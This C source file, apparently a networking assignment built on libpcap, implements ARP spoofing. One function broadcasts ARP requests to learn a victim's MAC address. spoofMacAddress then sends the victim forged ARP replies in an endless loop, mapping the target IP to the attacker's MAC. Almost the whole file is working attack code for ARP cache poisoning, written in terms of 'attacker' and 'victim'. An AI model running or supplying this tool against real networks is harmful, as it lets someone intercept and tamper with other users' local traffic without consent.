#include <arp.h>

int receiveArpPacket(IN pcap_t *handle, IN uint8_t *ipAddress, OUT arpStructure *receivedArpPacket) {
    int ret = EXIT_FAILURE;
    int waitCount = 20;
    arpStructure *arpPacket = NULL;

    // packet parsing
    while(ret && --waitCount) {
        printf("[*] Finding MAC Address...\n");
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        // end skeleton code

        // parse Ethernet in Datalink Layer
        ethernetHeader *ethernetPacket = (ethernetHeader *)packet;

        switch(ntohs(ethernetPacket->type)) {
            case ETHERNET_TYPE_ARP: // value is 0x0806
                arpPacket = (arpStructure *)(packet + sizeof(ethernetHeader));
                if(!memcmp(arpPacket->senderProtocolAddress, ipAddress, ARP_PROTOCOL_LENGTH_IP)) { 
                    // Print Ethernet Packet
                    printf("[*] Ethernet Information\n");
                    printMacAddress("  - Dest MAC : ", ethernetPacket->destinationMac);
                    printMacAddress("  - Src  MAC : ", ethernetPacket->sourceMac);
                    printf("  - Type     : [%04x]", ntohs(ethernetPacket->type));
                    printf("\n");

                    // Print ARP Packet
                    printf("[*] ARP Information\n");
                    printArpPacketInfo(*arpPacket);
                    memcpy(receivedArpPacket, arpPacket, sizeof(arpStructure));
                    printf("\n");
                    ret = EXIT_SUCCESS;
                }
                break;
            default:
                break;
        }

        sleep(1);
    }

    return ret;
}

int getVictimMacAddress(IN pcap_t *handle, IN char *interfaceName, IN char *victimIpAddress, OUT uint8_t *victimMacAddress) {
    int ret = EXIT_FAILURE;
    struct in_addr laddr;
    mergedStructure mergedPacket;
    arpStructure receivedArpPacket;

    // Initialize Ethernet Packet
    ethernetHeader ethernetPacket;

    // set source MAC Address for Ethernet
    if(getMacAddress(interfaceName, ethernetPacket.sourceMac) == EXIT_FAILURE) {
        fprintf(stderr, "Invalid Attacker MAC Address!\n");
        goto end;
    }

    // set destination MAC Address for Ethernet
    memset(ethernetPacket.destinationMac, 0xFF, ARP_HARDWARE_LENGTH_ETHERNET);

    // set Ethernet Type
    ethernetPacket.type = htons(ETHERNET_TYPE_ARP);

    // Initialize ARP Packet
    arpStructure arpPacket;
    arpPacket.hardwareType   = htons(ARP_HARDWARE_TYPE_ETHERNET);
    arpPacket.protocolType   = htons(ARP_PROTOCOL_TYPE_IP);
    arpPacket.hardwareLength = ARP_HARDWARE_LENGTH_ETHERNET;
    arpPacket.protocolLength = ARP_PROTOCOL_LENGTH_IP;
    arpPacket.operationCode  = htons(ARP_OPERATION_REQUEST);

    // set source MAC Address for ARP
    if(getMacAddress(interfaceName, arpPacket.senderHardwareAddress) == EXIT_FAILURE) {
        fprintf(stderr, "Invalid Attacker MAC Address!\n");
        goto end;
    }

    // set destination MAC Address
    memset(arpPacket.targetHardwareAddress, 0x00, ARP_HARDWARE_LENGTH_ETHERNET);

    // set source IP Address 
    if(getIpAddress(interfaceName, arpPacket.senderProtocolAddress) < 0) {
        fprintf(stderr, "Get IP Address Failed!\n");
        goto end;
    }

    // set destination IP Address 
    if(inet_aton(victimIpAddress, &laddr) < 0) {
        fprintf(stderr, "IP Address Format Invalid!\n");
        goto end;
    }
    memcpy(&arpPacket.targetProtocolAddress, &laddr.s_addr, ARP_PROTOCOL_LENGTH_IP);

    // assemble Packet
    memcpy(&mergedPacket.ethernetPacket, &ethernetPacket, sizeof(ethernetHeader));
    memcpy(&mergedPacket.arpPacket, &arpPacket, sizeof(arpStructure));

    printf("[+] Initialize\n");
    printArpPacketInfo(arpPacket);
    printf("\n");

    while(1) {
        printf("[*] Send ARP Packet\n");
        if(pcap_sendpacket(handle, (const u_char *)&mergedPacket, sizeof(mergedPacket))) {
            fprintf(stderr, "Send ARP Packet Error!\n");
            goto end;   
        }
        printf("\n");

        printf("[+] Get MAC Address\n");
        memset(receivedArpPacket.senderHardwareAddress, 0x00, ARP_HARDWARE_LENGTH_ETHERNET);
        if(receiveArpPacket(handle, arpPacket.targetProtocolAddress, &receivedArpPacket) == EXIT_SUCCESS) {
            memcpy(victimMacAddress, receivedArpPacket.senderHardwareAddress, ARP_HARDWARE_LENGTH_ETHERNET);
            break;
        }
    }

    ret = EXIT_SUCCESS;

end:
    return ret;
}

int spoofMacAddress(IN pcap_t *handle, IN char *interfaceName, IN char *victimIpAddress, IN char *targetIpAddress, IN uint8_t *victimMacAddress) {
    int ret = EXIT_FAILURE;
    struct in_addr laddr;
    uint8_t buf[sizeof(ethernetHeader) + sizeof(arpStructure)];
    arpStructure receivedArpPacket;

    // Initialize Ethernet Packet
    ethernetHeader ethernetPacket;

    // set source MAC Address for Ethernet
    if(getMacAddress(interfaceName, ethernetPacket.sourceMac) == EXIT_FAILURE) {
        fprintf(stderr, "Invalid Attacker MAC Address!\n");
        goto end;
    }

    // set destination MAC Address for Ethernet
    memcpy(ethernetPacket.destinationMac, victimMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);

    // set Ethernet Type
    ethernetPacket.type = htons(ETHERNET_TYPE_ARP);

    // Initialize ARP Packet
    arpStructure arpPacket;
    arpPacket.hardwareType   = htons(ARP_HARDWARE_TYPE_ETHERNET);
    arpPacket.protocolType   = htons(ARP_PROTOCOL_TYPE_IP);
    arpPacket.hardwareLength = ARP_HARDWARE_LENGTH_ETHERNET;
    arpPacket.protocolLength = ARP_PROTOCOL_LENGTH_IP;
    arpPacket.operationCode  = htons(ARP_OPERATION_REPLY);

    // set source MAC Address for ARP
    if(getMacAddress(interfaceName, arpPacket.senderHardwareAddress) == EXIT_FAILURE) {
        fprintf(stderr, "Invalid Attacker MAC Address!\n");
        goto end;
    }

    // set destination MAC Address
    memcpy(arpPacket.targetHardwareAddress, victimMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);

    // set source IP Address 
    if(inet_aton(targetIpAddress, &laddr) < 0) {
        fprintf(stderr, "IP Address Format Invalid!\n");
        goto end;
    }
    memcpy(&arpPacket.senderProtocolAddress, &laddr.s_addr, ARP_PROTOCOL_LENGTH_IP);

    // set destination IP Address 
    if(inet_aton(victimIpAddress, &laddr) < 0) {
        fprintf(stderr, "IP Address Format Invalid!\n");
        goto end;
    }
    memcpy(&arpPacket.targetProtocolAddress, &laddr.s_addr, ARP_PROTOCOL_LENGTH_IP);

    // Assemble Packet
    memcpy(buf, &ethernetPacket, sizeof(ethernetHeader));
    memcpy(buf + sizeof(ethernetHeader), &arpPacket, sizeof(arpStructure));

    printf("[+] Initialize\n");
    printArpPacketInfo(arpPacket);
    printf("\n");

    while(1) {
        printf("[*] Send ARP Packet...\n");
        if(pcap_sendpacket(handle, buf, sizeof(buf))) {
            fprintf(stderr, "Send ARP Packet Error!\n");
            goto end;   
        }
        sleep(1);
    }

    ret = EXIT_SUCCESS;

end:
    return ret;
}
